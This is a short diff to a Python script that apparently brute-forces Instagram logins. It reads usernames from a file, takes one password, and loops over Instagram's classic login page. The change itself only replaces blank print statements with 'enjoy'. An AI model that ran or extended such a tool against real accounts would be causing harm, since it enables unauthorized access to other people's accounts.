@@ -44,10 +44,10 @@ def brute():
         print (y+"       Kancot Team - HVmbl3")
         print (y+"   https://github.com/kancotdiq")
         print (g+"|=|============================|=|")
-        print ""
+        print("enjoy") 
         username = f.readline()
         password = raw_input(b+"    Password  "+r+": "+y)
-        print ""
+        print ("enjoy")
         count = 1
         while username:
             br.open("https://www.instagram.com/accounts/login/?force_classic_login")
